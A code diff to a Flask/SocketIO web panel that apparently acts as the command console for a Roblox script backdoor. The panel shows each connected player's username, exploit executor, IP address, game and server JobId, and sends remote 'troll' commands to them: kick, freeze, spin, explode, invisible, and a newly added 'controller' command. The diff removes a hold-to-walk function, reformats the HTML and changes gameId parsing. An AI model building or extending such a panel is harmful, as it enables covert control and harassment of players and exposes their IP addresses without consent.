@@ -42,9 +42,7 @@ def protect_routes():
     if request.path in ["/", "/kick", "/troll"]:
         check_ip()
 
-# === HTML du panel ===
-HTML = """
-<!DOCTYPE html>
+HTML = """<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -133,15 +131,6 @@ function sendTroll(id, cmd) {
     toast(`${cmd.toUpperCase()} sent`, "danger");
 }
 
-function holdCommand(btn, id, cmd) {
-    let interval = null;
-    const start = () => { sendTroll(id, cmd); interval = setInterval(() => sendTroll(id, cmd), 300); };
-    const stop = () => clearInterval(interval);
-    btn.addEventListener("mousedown", start);
-    btn.addEventListener("mouseup", stop);
-    btn.addEventListener("mouseleave", stop);
-}
-
 function render(data) {
     document.getElementById("stats").innerHTML = `Players online: <b>${data.online}</b> / ${data.total}`;
     const grid = document.getElementById("players");
@@ -153,22 +142,19 @@ function render(data) {
         card.innerHTML = `
             <div class="status"><div class="dot ${p.online ? "online" : ""}"></div><span>${p.online ? "Online" : "Offline"}</span></div>
             <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (ID ${id})</div>
-            <div class="info">
-                Executor: ${p.executor}<br>
-                IP: ${p.ip}<br>
-                Game: <button class="kick-btn" style="background:#666;" onclick="window.open('https://www.roblox.com/fr/games/${p.gameId}', '_blank')">${p.game || 'Unknown'}</button><br>
-                JobId: ${p.jobId || "Unknown"}
-            </div>
+            <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}<br>
+            Game: <a href="https://www.roblox.com/fr/games/${p.gameId}" target="_blank">${p.game}</a><br>
+            JobId: ${p.jobId}</div>
             <div class="category">TROLLS</div>
             <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
                 <button class="kick-btn" style="background:linear-gradient(45deg,#ff3366,#ff5588);" onclick="openKickModal('${id}')">KICK</button>
-                <button class="kick-btn" id="walkBtn_${id}" style="background:linear-gradient(45deg,#00ffaa,#00cc88);">WALK</button>
                 <button class="kick-btn" style="background:linear-gradient(45deg,#ff00ff,#aa00aa);" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                 <button class="kick-btn" style="background:linear-gradient(45deg,#00ffff,#00aaaa);" onclick="sendTroll('${id}','spin')">SPIN</button>
                 <button class="kick-btn" style="background:linear-gradient(45deg,#ffff00,#aaaa00);" onclick="sendTroll('${id}','jump')">JUMP</button>
                 <button class="kick-btn" style="background:linear-gradient(45deg,#88ff88,#55aa55);" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                 <button class="kick-btn" style="background:linear-gradient(45deg,#ff5555,#aa0000);" onclick="sendTroll('${id}','explode')">EXPLODE</button>
                 <button class="kick-btn" style="background:linear-gradient(45deg,#5555ff,#0000aa);" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
+                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','controller')">CONTROLLER</button>
             </div>
             <div class="category">UNDO</div>
             <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
@@ -178,8 +164,6 @@ function render(data) {
                 <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','uninvisible')">UNINVISIBLE</button>
             </div>
         `;
-        const walkBtn = document.getElementById(`walkBtn_${id}`);
-        holdCommand(walkBtn, id, 'walk');
     });
     
     document.querySelectorAll('.card').forEach(c => {
@@ -196,8 +180,7 @@ socket.on("kick_notice", d => toast(`${d.username} → ${d.reason}`, "danger"));
 socket.on("status", d => toast(`${d.username} is now ${d.online ? "online" : "offline"}`));
 </script>
 </body>
-</html>
-"""
+</html>"""
 
 @app.route("/")
 def index():
@@ -218,7 +201,7 @@ def api():
                     "last": now,
                     "online": True,
                     "game": d.get("game", "Unknown"),
-                    "gameId": d.get("gameId", d.get("placeId", "0")),
+                    "gameId": d.get("gameId", 0),
                     "jobId": d.get("jobId", "Unknown")
                 }
                 socketio.emit("status", {"username": connected_players[uid]["username"], "online": True})
